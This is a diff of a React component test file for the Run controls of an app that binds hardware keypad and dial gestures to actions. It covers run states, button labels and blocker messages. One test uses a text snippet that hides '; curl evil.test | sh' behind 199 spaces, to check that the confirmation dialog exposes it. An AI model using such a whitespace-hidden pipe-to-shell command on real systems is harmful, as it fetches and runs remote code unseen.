@@ -2,7 +2,8 @@ import { describe, expect, it } from 'vitest';
 import { renderToStaticMarkup } from 'react-dom/server';
 import type { DisplaySettings, LiveDevice, ModuleControl, Profile } from './contracts';
 import { emptyKeypadPage } from './keypad-model';
-import { appControlNote, builtInKeypadBlocker, settingsErrorBlocker, settingsLoadingBlocker, softwareModeBox, confirmCopy, countdownSeconds, dialogCopy, isMacPlatform, phaseLabel, relativeTime, resumeCopy, runBlocker, runPreviewNote, serviceResumeId, disconnectedServiceValue, resolveServiceSelection, ServicePanel, settlePendingConfirm } from './ServicePanel';
+import { appControlNote, builtInKeypadBlocker, settingsErrorBlocker, settingsLoadingBlocker, softwareModeBox, confirmCopy, countdownSeconds, dialogCopy, isMacPlatform, phaseLabel, relativeTime, resumeCopy, runBlocker, runPreviewNote, serviceResumeId, disconnectedServiceValue, resolveServiceSelection, RunBlockerNotice, RunHeaderControl, ServicePanel, settlePendingConfirm, useRunSession } from './ServicePanel';
+import type { RunSessionOptions } from './ServicePanel';
 import { DisplaySettingsStore } from './display-settings';
 import { emptyCounters, ServiceRunner, serviceIdFor, type ServiceRun } from './service-runner';
 import { DeviceFeed } from './device-feed';
@@ -48,7 +49,7 @@ describe('platform and blockers', () => {
   });
 });
 
-function fixtures(execute: boolean, state: 'running' | 'failed' = 'running', extra: Record<string, unknown> = {}) {
+function fixtures(execute: boolean, state: 'running' | 'failed' | 'exited' = 'running', extra: Record<string, unknown> = {}) {
   const feed = new DeviceFeed(async () => [dial] as never, async () => () => {}, true);
   (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [dial] };
   const runner = new ServiceRunner(async () => undefined as never, async () => () => {}, true);
@@ -62,9 +63,21 @@ const setRun = (runner: ServiceRunner, patch: Record<string, unknown>) => {
   const id = serviceIdFor('aabb');
   (runner as unknown as { state: unknown }).state = { ...state, runs: { [id]: { ...state.runs[id], ...patch } } };
 };
-const render = (props: Partial<Parameters<typeof ServicePanel>[0]> & { feed?: DeviceFeed; runner?: ServiceRunner }) =>
-  renderToStaticMarkup(<ServicePanel profile={flat} desktop unsaved={false} platform={mac} now={2000} {...props} />);
+const render = (props: Partial<RunSessionOptions> = {}) => {
+  // The header Run control, its blocker strip and the panel share the hook, as in the app.
+  const View = () => {
+    const run = useRunSession({ profile: flat, desktop: true, unsaved: false, platform: mac, now: 2000, ...props });
+    return <><RunHeaderControl run={run} /><RunBlockerNotice run={run} /><ServicePanel run={run} /></>;
+  };
+  return renderToStaticMarkup(<View />);
+};
 // The idle Run panel for `device` with Module control `control` (loaded unless `state` says otherwise).
+function loadedSettings() {
+  const settings: DisplaySettings = { module_control: 'app', dial_content: 'function', auto_execute: false };
+  const displaySettings = new DisplaySettingsStore(async <T,>() => settings as T, true);
+  (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: true, settings };
+  return displaySettings;
+}
 function panelFor(device: LiveDevice, control: ModuleControl, profile: Profile, state: { loaded?: boolean; error?: string | null } = {}) {
   const feed = new DeviceFeed(async () => [] as never, async () => () => {}, true);
   (feed as unknown as { state: unknown }).state = { ...feed.getState(), devices: [device] };
@@ -74,7 +87,8 @@ function panelFor(device: LiveDevice, control: ModuleControl, profile: Profile, 
   (displaySettings as unknown as { state: unknown }).state = { ...displaySettings.getState(), loaded: state.loaded ?? true, error: state.error ?? null, settings };
   return render({ feed, runner, profile, displaySettings });
 }
-const runDisabled = /<button[^>]*disabled=""[^>]*>[^<]*<svg[^>]*>.*Run</s;
+// The header Run button, disabled with its spinner and its target label ("Run", "Run on 15-key", …).
+const runDisabled = /<button[^>]*disabled=""[^>]*>[^<]*<svg[^>]*>.*Run/s;
 
 describe('ServicePanel markup', () => {
   it('shows an unmistakable banner while executing', () => {
@@ -145,7 +159,7 @@ describe('ServicePanel markup', () => {
     const profile: Profile = { schema_version: 1, name: 'Ops', bindings: [{ module: 'm003k', control: 0, gesture: 'pressed', action: { type: 'text', text: `${' '.repeat(199)}; curl evil.test | sh`, press_enter: false } }] };
     const copy = confirmCopy('start', 'Ops', 'X', false, profile);
     expect(copy).toMatchObject({ risk: 'elevated', warning: null, acknowledge: null, snippets: [{ text: `${' '.repeat(199)}; curl evil.test | sh`, more: 0, pressEnter: false }] });
-    expect(renderToStaticMarkup(<ServicePanel profile={profile} desktop unsaved={false} platform={mac} now={2000} />)).toContain(`${' '.repeat(199)}; curl evil.test | sh</code>`);
+    expect(render({ profile })).toContain(`${' '.repeat(199)}; curl evil.test | sh</code>`);
     expect(copy.lines[0]).toBe('Pastes 1 text snippet into the focused app (shown below).');
   });
   it('disables Execute off macOS and explains it', () => {
@@ -231,6 +245,77 @@ describe('ServicePanel markup', () => {
   });
 });
 
+describe('header Run control', () => {
+  it('shows the run state: Stopped, Dry run and Executing, in the header and the panel badge', () => {
+    expect(phaseLabel(undefined)).toBe('Stopped');
+    // A dry run and an executing run are named by what they do, never just "Running".
+    const dry = fixtures(false);
+    expect(render({ feed: dry.feed, runner: dry.runner })).toContain('run-state-pill running" role="status">Dry run</span>');
+    const live = fixtures(true);
+    const executing = render({ feed: live.feed, runner: live.runner });
+    expect(executing).toContain('run-state-pill running executing" role="status">Executing</span>');
+    expect(executing).toContain('service-badge running executing" role="status">Executing</span>');
+  });
+  it('offers Run when stopped (disabled with its blocker) and Stop while a run is active', () => {
+    const idle = render();
+    expect(idle).toContain('run-state-pill idle" role="status">Stopped</span>');
+    expect(idle).toMatch(/<button type="button" class="button primary" disabled="" title="[^"]*">/);
+    const { feed, runner } = fixtures(false);
+    const active = render({ feed, runner });
+    expect(active).toContain('>Stop</button>');
+    expect(active).not.toMatch(/<button[^>]*class="button primary"[^>]*>/);
+  });
+  it('keeps Run and Stop out of the panel; the panel keeps device and mode selection', () => {
+    const { feed, runner } = fixtures(false);
+    const markup = render({ feed, runner });
+    expect(markup).toContain('aria-label="Run control"');
+    expect(markup).toContain('id="service-device"');
+    expect(markup).toContain('aria-label="Run mode"');
+    // Exactly one Stop across header and panel.
+    expect(markup.match(/>Stop</g)).toHaveLength(1);
+  });
+  it('offers Resume and Stop in the header for a paused run', () => {
+    const { feed, runner } = fixtures(true, 'running', {
+      session: { serviceId: null, phase: 'needs_confirmation', reason: 'sleep', attempt: 0, module: 'm131e', serialNumber: 'ABCDEF123456' } });
+    const markup = render({ feed, runner });
+    expect(markup).toContain('>Resume…</button>');
+    expect(markup).toContain('>Stop</button>');
+    expect(markup).toContain('run-state-pill needs_confirmation" role="status">Needs confirmation</span>');
+  });
+  it('names the module a start would use on the Run button', () => {
+    // A stopped run, so the header offers Run again.
+    const { feed, runner } = fixtures(false, 'exited');
+    expect(render({ feed, runner, displaySettings: loadedSettings() })).toContain('>Run on encoder</button>');
+    // Without a device there is nothing to name.
+    expect(render()).toContain('>Run</button>');
+    // The tooltip still carries the full device name with its serial.
+    expect(render({ feed, runner, displaySettings: loadedSettings() })).toMatch(/title="Dry run on Encoder IPS display S1"/);
+  });
+  it('warns with danger styling and the full label before an Execute run', () => {
+    const { feed, runner } = fixtures(false, 'exited');
+    const markup = render({ feed, runner, displaySettings: loadedSettings(), initialExecute: true });
+    expect(markup).toContain('>Run with actions on encoder</button>');
+    expect(markup).toMatch(/<button type="button" class="button danger" title="Run with actions on Encoder IPS display S1"/);
+    // Dry run stays primary.
+    expect(render({ feed, runner, displaySettings: loadedSettings() })).toMatch(/<button type="button" class="button primary" title="Dry run on Encoder IPS display S1"/);
+  });
+  it('shows a blocked Run its reason as a strip in the header, not only as a tooltip', () => {
+    // A connected module with a blocked profile (Built-in animation) names the setting in the strip.
+    const blocked = panelFor(keypad, 'built_in_animation', nested);
+    expect(blocked).toContain('class="run-blocker-strip" role="status"');
+    expect(blocked).toContain(builtInKeypadBlocker);
+    expect(blocked).toMatch(new RegExp(`<span>${builtInKeypadBlocker}</span>`));
+    // The panel no longer repeats the blocker; the strip is its single home.
+    expect(blocked).not.toContain('service-blocker');
+    // An active run shows no blocker.
+    const { feed, runner } = fixtures(false);
+    expect(render({ feed, runner })).not.toContain('run-blocker-strip');
+    // The browser preview omits the strip: its own banner already says the desktop app is needed.
+    expect(render({ desktop: false })).not.toContain('run-blocker-strip');
+    expect(render({ desktop: false })).toMatch(/title="[^"]*needs the desktop app[^"]*"/);
+  });
+});
+
 describe('session banners', () => {
   // A session without a process belongs to the device with its module and serial, not to whatever sits at its old path.
   const sessionFor = (phase: string, extra: Record<string, unknown> = {}, execute = true) => {
@@ -301,7 +386,7 @@ describe('session banners', () => {
     expect(markup).toContain('HID read failed');
     expect(markup).not.toContain(liveBanner);
     expect(markup).not.toContain('>Stop<');
-    expect(markup).toContain('>Run<');
+    expect(markup).toContain('>Run on encoder</button>');
   });
   it('a refused start shows its plain reason once, with no reconnect banner or raw service output', () => {
     const detail = 'This profile\'s 15-key pages run live only when OpenStreamHub controls the module. Module control in Settings is set to Built-in animation: set it to App, then start the profile again.';
@@ -313,7 +398,7 @@ describe('session banners', () => {
     expect(markup.split('Module control in Settings is set to Built-in animation').length).toBe(2);
     expect(markup).not.toContain('Reconnecting');
     expect(markup).not.toContain('--display-sync');
-    expect(markup).toContain('>Run<');
+    expect(markup).toContain('>Run on encoder</button>');
   });
   it('keeps showing the session when no device is connected', () => {
     const { runner } = sessionFor('waiting_for_device');
